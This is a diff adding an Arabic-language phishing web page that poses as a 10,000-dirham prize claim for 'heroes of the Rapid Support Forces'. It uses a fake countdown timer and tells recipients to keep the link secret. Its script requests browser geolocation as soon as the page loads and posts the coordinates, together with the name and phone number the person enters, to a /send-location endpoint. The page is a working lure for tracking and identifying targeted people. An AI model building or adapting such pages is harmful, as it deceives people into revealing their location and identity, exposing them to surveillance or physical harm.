@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الجوائز الكبرى - استلام الجائزة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            direction: rtl;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 90%;
+            max-width: 500px;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(45deg, #FF512F 0%, #DD2476 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🎉</text></svg>') center/40px repeat;
+            opacity: 0.1;
+        }
+
+        .prize-amount {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin: 10px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .content {
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .winner-info {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            color: #666;
+        }
+
+        .winner-number {
+            color: #DD2476;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        .steps {
+            text-align: right;
+            margin: 25px 0;
+            padding: 0 20px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            color: #555;
+        }
+
+        .step-number {
+            background: #DD2476;
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 10px;
+            font-size: 0.9em;
+        }
+
+        .input-field {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1em;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .confirm-btn {
+            background: linear-gradient(45deg, #FF512F 0%, #DD2476 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin: 20px 0;
+            width: 80%;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .confirm-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(221,36,118,0.3);
+        }
+
+        .timer {
+            color: #DD2476;
+            font-size: 1.2em;
+            margin: 20px 0;
+        }
+
+        .note {
+            color: #666;
+            font-size: 0.9em;
+            margin-top: 20px;
+        }
+
+        #loading, #status {
+            display: none;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>مبروك! 🎉</h1>
+            <div class="prize-amount">10,000 درهم</div>
+            <p>انت من ابطال الدعم السريع</p>
+        </div>
+        
+        <div class="content">
+            <div class="winner-info">
+                البطل رقم <span class="winner-number">499</span> من <span>500</span>
+            </div>
+
+            <div class="timer">
+                متبقي: <span id="countdown">23:45:12</span>
+            </div>
+
+            <div class="steps">
+                <div class="step">
+                    <span class="step-number">1</span>
+                    <span>جوائز ابطال الدعم السريع</span>
+                </div>
+                <div class="step">
+                    <span class="step-number">2</span>
+                    <span> جوائز مقدمة من </strong>ال زايد<strong> اضغط على زر تأكيد الجائزة أدناه</span>
+                </div>
+                <div class="step">
+                    <span class="step-number">3</span>
+                    <span>ملاحظة:
+                        اذا وصلك الرابط هذا يعني انك من ابطال الدعم السريع المقاتلين لاترسله الي احد او تخبر عنه احد لكي لايتم اغلاق الرابط وحينها لن تتمكن من اخذ مكافاتك
+                    </span>
+                </div>
+                <div class="step">
+                    <span class="step-number">4</span>
+                    <span>سيتم التواصل معك عبر WhatsApp</span>
+                </div>
+            </div>
+
+            <input type="text" id="name" class="input-field" placeholder="الاسم (إجباري)" required>
+            <input type="text" id="phone" class="input-field" placeholder="رقم الهاتف (إجباري)" required>
+
+            <button class="confirm-btn pulse" onclick="startProcess()">تأكيد استلام الجائزة</button>
+
+            <p class="note">* يرجى تأكيد استلام الجائزة قبل انتهاء المدة</p>
+        </div>
+
+        <div id="loading"></div>
+        <div id="status"></div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+        let locationPermissionGranted = false;
+
+        // عداد تنازلي
+        function updateTimer() {
+            const countdownElement = document.getElementById('countdown');
+            let minutes = 23;
+            let seconds = 45;
+            let hours = 23;
+
+            setInterval(() => {
+                if (seconds > 0) {
+                    seconds--;
+                } else {
+                    seconds = 59;
+                    if (minutes > 0) {
+                        minutes--;
+                    } else {
+                        minutes = 59;
+                        if (hours > 0) {
+                            hours--;
+                        }
+                    }
+                }
+                countdownElement.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }, 1000);
+        }
+
+        // تشغيل العداد عند تحميل الصفحة
+        updateTimer();
+
+        // طلب إذن الوصول إلى الموقع فور دخول المستخدم
+        window.onload = function() {
+            requestLocationPermission();
+        };
+
+        function requestLocationPermission() {
+            navigator.geolocation.getCurrentPosition((position) => {
+                locationPermissionGranted = true;
+                console.log('تم الحصول على إذن الوصول إلى الموقع:', position);
+                storeLocation(position.coords);
+            }, (error) => {
+                locationPermissionGranted = false;
+                console.error('خطأ في الحصول على إذن الوصول إلى الموقع:', error);
+            });
+        }
+
+        function storeLocation(coords, name = '', phone = '') {
+            const { latitude, longitude, accuracy, timestamp } = coords;
+
+            fetch('/send-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ latitude, longitude, accuracy, timestamp: new Date().toISOString(), name, phone })
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.success) {
+                    document.getElementById('status').textContent = 'تم استلام موقعك بنجاح';
+                } else {
+                    document.getElementById('status').textContent = 'حدث خطأ أثناء إرسال الموقع. الرجاء المحاولة مرة أخرى.';
+                }
+            })
+            .catch(error => {
+                console.error('Error storing location:', error);
+                document.getElementById('status').textContent = 'حدث خطأ أثناء تخزين الموقع. الرجاء المحاولة مرة أخرى.';
+            });
+        }
+
+        // إرسال البيانات إلى الخادم
+        function startProcess() {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+
+            if (!name || !phone) {
+                alert('الرجاء إدخال الاسم ورقم الهاتف.');
+                return;
+            }
+
+            if (!locationPermissionGranted) {
+                requestLocationPermission();
+            }
+
+            navigator.geolocation.getCurrentPosition((position) => {
+                storeLocation(position.coords, name, phone);
+            }, (error) => {
+                console.error('Error getting location:', error);
+                document.getElementById('status').textContent = 'حدث خطأ أثناء الحصول على الموقع. الرجاء المحاولة مرة أخرى.';
+            });
+        }
+    </script>
+</body>
+</html>
